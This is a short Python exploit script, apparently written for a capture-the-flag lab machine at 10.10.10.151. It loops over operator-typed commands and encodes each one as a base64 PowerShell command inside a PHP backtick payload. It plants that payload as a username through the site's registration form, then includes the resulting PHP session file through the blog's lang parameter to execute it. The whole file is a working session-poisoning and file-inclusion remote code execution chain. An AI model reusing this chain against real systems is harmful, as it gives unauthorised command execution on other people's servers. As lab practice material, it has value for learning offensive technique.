import requests
import string
import os
import base64

loginurl = "http://10.10.10.151/user/login.php"
registerurl = "http://10.10.10.151/user/registration.php"

while True:
    command = raw_input("Insert the commnad: ")
    command = os.popen('echo -n \''+command+'\' | iconv -t utf-16le | base64 -w 0').read()
    temp = command
    command = '<?=`powershell /enc '+command+'`?>'
    print(command)

    data ={'email':'test@test.com','username':command,'password':'pass'}
    register = requests.post(url = registerurl, data = data)

    data = {'username':command,'password':'pass','submit':' '}

    login = requests.get(url = loginurl, data = data)
    cookie = login.cookies#.values()[0]
    login = requests.post(url = loginurl, data = data, cookies = cookie)
    print(cookie.values()[0])
    curl = requests.get(url='http://10.10.10.151/blog/?lang=/windows/temp/sess_'+cookie.values()[0])
    #curl = os.popen('curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_'+cookie.values()[0])
    print(curl.text)
    print(command)
    print(base64.b64decode(temp))
